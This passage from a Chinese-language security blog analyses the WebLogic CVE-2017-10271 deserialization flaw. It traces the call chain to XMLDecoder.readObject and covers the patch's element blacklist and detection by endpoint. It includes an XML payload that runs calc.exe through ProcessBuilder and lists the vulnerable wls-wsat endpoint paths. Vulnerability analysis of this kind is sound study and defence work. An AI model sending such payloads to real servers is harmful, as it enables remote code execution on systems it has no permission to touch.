class="line">&lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>​        利用成功后会返回500，不过这并不影响我们的命令执行。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201030232045855.png" alt="image-20201030232045855"></p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201030232431039.png" alt="image-20201030232431039"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>​        因为这个漏洞在利用成功之后会返回调用栈，所以我们可以直接在最终调用的函数上打一个断点，那样就能直观的看到这个漏洞执行的调用链。这里我们可以看到最终执行的java.lang.ArrayIndexOutOfBoundsException类里的方法抛出异常，因此我们找到这个类。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201031102101881.png" alt="image-20201031102101881"></p>
<p>​        可以使用快捷键ctrl+alt+shift+n来快速找到这个类名。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201031102202120.png" alt="image-20201031102202120"></p>
<p>​        我们找到ArrayIndexOutOfBoundsException后，因为从调用栈中看不到调用了哪个方法，因此我们在这个类中仅有的三个方法中下断点，发送payload进行测试，在传递String类型参数的方法中断住了，然后我们在idea中，就可以看到这个漏洞的一个整体的调用栈。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201031103008416.png" alt="image-20201031103008416"></p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201031103137794.png" alt="image-20201031103137794"></p>
<p>​        为了测试哪些调用和我们的访问路径有关，哪些调用栈是weblogic运行过程中本身调用的，我对调用栈中的调用进行了测试，我发现只要我们运行着weblogic，ExecuteThread类的execute方法总是会被不断调用的。即使我没有向weblogic发送任何请求。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201031105302535.png" alt="image-20201031105302535"></p>
<p>​        而ServletRequestImpl类的run方法，只有我们访问wls-wsat目录下的方法时才会被调用，访问其他目录则不会被调用。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201031105346498.png" alt="image-20201031105346498"></p>
<p>​        我们再来看一下当我们访问/wls-wsat/CoordinatorPortType目录时的调用流程，当我们访问到这个url时，会被路由到wls-wsat.war包下进行处理，我们看下web.xml文件，发现这个调用会交给weblogic.wsee.wstx.wsat.v10.endpoint.CoordinatorPortTypePortImpl类进行处理。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201101195556241.png" alt="image-20201101195556241"></p>
<p>​        我们跟进到这个类中，可以看到这个类是一个处理webservice的接口，</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201101195741595.png" alt="image-20201101195741595"></p>
<p>​        由于对webservice不是很熟悉，跟进去CoordinatorPortType接口中也没看懂这个接口是执行了什么操作，不过这个好像也无关紧要，因为我发现即使调用其他路由也是可以成功触发漏洞的，所以说明这个漏洞的触发和这个接口具体的参数没有什么关系。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201101213816637.png" alt="image-20201101213816637"></p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201101213858504.png" alt="image-20201101213858504"></p>
<p>​        好了，我们回归正题，我们通过查看调用链可以知道，这个漏洞最终之所以能被触发是因为调用了xmlDecoder.readObject()方法，因此我们只要理清是什么原因导致了可以调用到这个方法就可以了。</p>
<p>​        首先调用了一些servlet处理的方法，关于servlet调用的过程比较复杂，我不一一分析了，这里仅仅向大家证明这个调用栈的哪些部分属于servlet的调用。</p>
<p>​        我随便找了一个servlet的接口以GET方式去请求，可以在StubSecurityHelper$ServletServiceAction  run方法上下到断点，因此我们可以理解只要去调用servlet的接口，这些方法都会被调用，因此我们在分析的过程中可以不看这些调用栈，可以简单的理解为对于servlet处理的过程。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201101222906523.png" alt="image-20201101222906523"></p>
<p>​        而后面的一些方法则需要调用jaxws包下的内容，我们知道jaxws是用来处理webservice的，因此只有处理webservice时，后面的方法才会被调用，因此这个漏洞的触发需要调用webservice的方法。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201101233441734.png" alt="image-20201101233441734"></p>
<p>​        我们着重分析一下JAXWServlet以后的处理流程，先看一下doRequest方法，这个方法首先设置了一些属性，再去判断调用的请求类型，由于我们调用的是POST方法，因此调用了httpProcessor.post（）</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201102232400860.png" alt="image-20201102232400860"></p>
<p>​        从post到handle部分可能主要是做一些权限认证方面的处理，认证通过后调用handle进行处理</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201111202947944.png" alt="image-20201111202947944"></p>
<p>​    从header 到processRequest部分因为看不到代码所以也看不出来weblogic是如何处理这部分内容的</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201111204148540.png" alt="image-20201111204148540"></p>
<p>​    processRequest方法处理过程如下，首先判断传入的var1是否为空，判断部位空后获取header,再从获取的header中查找是否存在WORK_AREA_HEADER,如果存在，则执行readHeaderOld方法</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201111204541538.png" alt="image-20201111204541538"></p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201111204411985.png" alt="image-20201111204411985"></p>
<p>​    在readHeaderOld方法中，将我们输入的请求体的内容进行解析，注意new WorkContextXmlInputAdapter()操作，跟进WorkContextXmlInputAdapter，实际上这里是创建一个xmldecoder对象并且将我们的请求体内容传进去。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201111205220071.png" alt="image-20201111205220071"></p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201111205354553.png" alt="image-20201111205354553"></p>
<p>​    创建WorkContextXmlInputAdapter对象以后，调用receive方法</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201111210231033.png" alt="image-20201111210231033"></p>
<p>​    再经过几层调用，来到readEntry方法，调用了xmldecoder.readObject()方法进行解析，最终导致了反序列化xml代码和命令执行。<img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201111210332731.png" alt="image-20201111210332731"></p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201111210620461.png" alt="image-20201111210620461"></p>
<p>​    可能有些同学不理解为什么xmldecoder.readObject()会导致反序列化，我这里写一个demo代码进行测试。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import java.beans.XMLDecoder;</span><br><span class="line">import java.io.BufferedInputStream;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line"></span><br><span class="line">public class xmldecoder &#123;</span><br><span class="line">    public static void main(String[] args) throws FileNotFoundException &#123;</span><br><span class="line">        File file &#x3D;new File(&quot;d:\\test.xml&quot;);</span><br><span class="line">        FileInputStream fis &#x3D; new FileInputStream(file);</span><br><span class="line">        BufferedInputStream bis &#x3D; new BufferedInputStream(fis);</span><br><span class="line">        XMLDecoder xdsec &#x3D; new XMLDecoder(bis);</span><br><span class="line">        xdsec.readObject();</span><br><span class="line">        xdsec.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    在d:\test.xml的内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;java version&#x3D;&quot;1.8.0_131&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">    &lt;object class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">        &lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;1&quot;&gt;</span><br><span class="line">            &lt;void index&#x3D;&quot;0&quot;&gt;</span><br><span class="line">                &lt;string&gt;calc.exe&lt;&#x2F;string&gt;</span><br><span class="line">            &lt;&#x2F;void&gt;</span><br><span class="line">        &lt;&#x2F;array&gt;</span><br><span class="line">        &lt;void method&#x3D;&quot;start&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;object&gt;</span><br><span class="line">&lt;&#x2F;java&gt;</span><br></pre></td></tr></table></figure>

<p>​    当执行完readaobject后，我们的xml代码被执行</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201112175014300.png" alt="image-20201112175014300"></p>
<p>​    看完上面的代码，我想我们已经知道xmldecoder.readobject可以造成命令执行了，不过为什么我们传入的xml内容会被解析并最终导致命令执行呢？我跟进了这个readObject的调用过程，由于整体的调用过程比较复杂，我就不具体分析了，这里先给出调用链</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201112194152425.png" alt="image-20201112194152425"></p>
<p>​    主要的执行部分在getValueObject这个方法中，因此我们主要看一下这个方法,这个方法在我解析这个xml的过程中被调用了三次，首先判断Index是否为空，第一次解析过程中我们index的内容不为空，而是0，因此会进入这个if判断，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;void index&#x3D;&quot;0&quot;&gt;&lt;&#x2F;void&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113101448089.png" alt="image-20201113101448089"></p>
<p>​    并且由于var2的内容为2,因此var4的值会被设置为set</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113101928381.png" alt="image-20201113101928381"></p>
<p>​    之后程序会执行到下面这段代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Expression var5 &#x3D; new Expression(var3, var4, var2);</span><br></pre></td></tr></table></figure>

<p>​    跟进去后发现其会调用父类的构造方法</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113102206786.png" alt="image-20201113102206786"></p>
<p>​    跟进父类的构造方法，会给target，methodName，arguments分别进行赋值</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113102301063.png" alt="image-20201113102301063"></p>
<p>​    最后程序会调用var5.getValue()方法</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113102428144.png" alt="image-20201113102428144"></p>
<p>​        跟进getvalue()方法后，我们看到又调用了invoke方法</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113102524670.png" alt="image-20201113102524670"></p>
<p>​    跟进invoke方法，首先会做一个权限判断，判断完成后会调用invokeInternal方法</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113102652354.png" alt="image-20201113102652354"></p>
<p>​    invokeInternal方法是命令执行的重点，我们跟进去看一下，首先通过获取当前对象的target和methodName，这两个值之前已经经过了设置。再获取arguments的内容，再判断methodName是否包含forName，如果包含则通过反射来创建类，我们调用的methodName不包含forName，所以不会执行if语句中的内容。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113102945526.png" alt="image-20201113102945526"></p>
<p>​    下面再去获取了arguments的类型，我们传入的两个参数一个是0一个是calc.exe，因此是integer和String类型</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113103829117.png" alt="image-20201113103829117"></p>
<p>​    最后程序会将arguments[0]转换后赋值给index，最后调用Array.set设置值，设置完以后大概是target[0]=”calc.exe”这个样子，到此第一次调用结束。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113110701464.png" alt="image-20201113110701464"></p>
<p>​    第二次调用中，index的内容为空，并且property也为空，因此会进入到else代码中，因为method的值为null，因此var4会被设置为new</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113104635913.png" alt="image-20201113104635913"></p>
<p>​    再跟进 new Expression(var3, var4, var2),在父类的构造方法中，对target，methodName,和arguments的参数进行设置。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113110930916.png" alt="image-20201113110930916"></p>
<p>​    我们再看一下invokeInternal方法， 首先还是获取target,methodName,arguments参数，判断methodName是否包含forname,这里methodName为new，因此不会进入if判断。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113111115897.png" alt="image-20201113111115897"></p>
<p>​    下面再判断了target是否为Class类型的实例，这里会进入if判断，将methodName设置为newInstance，再到第二个if判断，由于(Class)target).isArray()不是array，因此会跳过这个if判断</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113111320290.png" alt="image-20201113111320290"></p>
<p>​        在往下走，methodName和arguments满足if判断，因此会进入第一个if判断，但是由于target 不是Character.class，因此不会进入第二个if判断。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113112023557.png" alt="image-20201113112023557"></p>
<p>​    再往下走，通过ConstructorFinder.findConstructor获取类class java.lang.ProcessBuilder参数为String[]类型的构造器</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113112709493.png" alt="image-20201113112709493"></p>
<pre><code>最后通过newInstance获取一个实例对象，至此第二次调用结束了。</code></pre><p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113112934347.png" alt="image-20201113112934347"></p>
<p>​    在第三次调用中，var4为start</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113113230022.png" alt="image-20201113113230022"></p>
<p>​    跟进Expression调用的父类构造方法，我们可以看到这次传入的target和arguments内容都为对象，methodName为start</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113113347471.png" alt="image-20201113113347471"></p>
<p>​    之后我们再看一下invokeInternal方法，再287行通过反射调用获取到了start方法</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113113815896.png" alt="image-20201113113815896"></p>
<p>​    最后通过invoke来调用processbuilder.start方法，导致calc.exe被执行。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113113850934.png" alt="image-20201113113850934"></p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>​    最后我们看一下weblogic对这个漏洞是如何修复的，我尝试在官网下载补丁，但好像是付费用户才能下载到</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113135529651.png" alt="image-20201113135529651"></p>
<p>​    没有办法，只能在网上看别人的代码，补丁代码如下，在进行解析的时候对object,new,method,viod等关键设置了黑名单。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public void startElement(String uri, StringlocalName, String qName, Attributes attributes) throws SAXException &#123;</span><br><span class="line">if(qName.equalsIgnoreCase(“object”))&#123;</span><br><span class="line">throw newIllegalStateException(“Invalid element qName:object”);</span><br><span class="line">&#125; else if(qName.equalsIgnoreCase(“new”))&#123;</span><br><span class="line">throw newIllegalStateException(“Invalid element qName:new”);</span><br><span class="line">&#125; else if(qName.equalsIgnoreCase(“method”))&#123;</span><br><span class="line">throw newIllegalStateException(“Invalid element qName:method”);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">if(qName.equalsIgnoreCase(“void”)) &#123;</span><br><span class="line">for(int attClass &#x3D; 0; attClass&lt; attributes.getLength(); ++attClass) &#123;</span><br><span class="line">if(!”index”.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</span><br><span class="line">throw newIllegalStateException(“Invalid attribute for element void:” +attributes.getQName(attClass));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    但是我之前调试的时候发现startElement应该是XMLDecoder类实现的，而这个类是jdk的一个类，经过跟进weblogic的xmldecoder.readobject方法后，我发现weblogic调用的readobject后的调用链和jdk提供的xmldecoder调用链是不一样的，它在调用过程中还是会调用一些weblogic自己实现的一些类。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113150901231.png" alt="image-20201113150901231"></p>
<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>​    经过分析我们知道这个漏洞的触发并不是一定必须访问/wls-wsat/CoordinatorPortType接口,wls-wsat.war下web.xml中定义的所有关于webservice的接口都是可以触发这个漏洞的，可以触发该漏洞的接口如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;wls-wsat&#x2F;CoordinatorPortType</span><br><span class="line">&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC</span><br><span class="line">&#x2F;wls-wsat&#x2F;ParticipantPortType</span><br><span class="line">&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType</span><br><span class="line">&#x2F;wls-wsat&#x2F;CoordinatorPortType11</span><br><span class="line">&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC11</span><br><span class="line">&#x2F;wls-wsat&#x2F;ParticipantPortType11</span><br><span class="line">&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure>

<p>​    既然这个漏洞是请求webservice接口导致的，那么我想找一下是否有其他请求webservice的接口，因为webservice都会有webservices.xml这个配置文件，因此应该是没其他调用webservice接口的地址了。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113115929868.png" alt="image-20201113115929868"></p>
<p>​    另外由于weblogic的补丁并不是将wls-wsat.war删除，而是找了一个做了一些黑名单过滤，因此单单通过访问/wls-wsat/下的接口判断是否存在是不行的，不过可以将判断这些接口是否存在当作一个参考，毕竟只有当这些接口存在是，才能触发这个漏洞，有些waf在防御这个漏洞是更是粗暴简单只要访问了这个wls-wsat目录下的内容，全部拒绝。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="post-title-link" itemprop="url">weblogic漏洞分析系列之调试环境搭建</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-10-30 20:32:17" itemprop="dateCreated datePublished" datetime="2020-10-30T20:32:17+08:00">2020-10-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-12-24 10:05:01" itemprop="dateModified" datetime="2020-12-24T10:05:01+08:00">2020-12-24</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
